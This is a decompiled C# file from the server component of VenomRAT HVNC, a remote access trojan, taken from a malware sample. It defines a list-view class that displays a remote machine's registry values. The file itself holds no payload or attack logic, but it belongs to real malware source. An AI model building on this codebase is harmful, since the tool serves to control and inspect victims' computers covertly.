// Decompiled with JetBrains decompiler
// Type: VenomRAT_HVNC.Server.Helper.RegistryValueLstItem
// Assembly: VenomRAT_HVNC, Version=5.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 364FC72B-4DB8-403E-BB7F-732199A12380
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-666d190a7059c03b3572dd66e51b8232537a8650bbdcbfbe3f8335c830f3aeae.exe

using System.Windows.Forms;

namespace VenomRAT_HVNC.Server.Helper
{
  public class RegistryValueLstItem : ListViewItem
  {
    private string _type { get; set; }

    private string _data { get; set; }

    public string RegName
    {
      get => this.Name;
      set
      {
        this.Name = value;
        this.Text = RegValueHelper.GetName(value);
      }
    }

    public string Type
    {
      get => this._type;
      set
      {
        this._type = value;
        if (this.SubItems.Count < 2)
          this.SubItems.Add(this._type);
        else
          this.SubItems[1].Text = this._type;
        this.ImageIndex = this.GetRegistryValueImgIndex(this._type);
      }
    }

    public string Data
    {
      get => this._data;
      set
      {
        this._data = value;
        if (this.SubItems.Count < 3)
          this.SubItems.Add(this._data);
        else
          this.SubItems[2].Text = this._data;
      }
    }

    public RegistryValueLstItem(RegistrySeeker.RegValueData value)
    {
      this.RegName = value.Name;
      this.Type = value.Kind.RegistryTypeToString();
      this.Data = RegValueHelper.RegistryValueToString(value);
    }

    private int GetRegistryValueImgIndex(string type)
    {
      if (type == "REG_MULTI_SZ" || type == "REG_SZ" || type == "REG_EXPAND_SZ")
        return 0;
      if (type == "REG_BINARY" || type == "REG_DWORD" || type == "REG_QWORD")
        ;
      return 1;
    }
  }
}
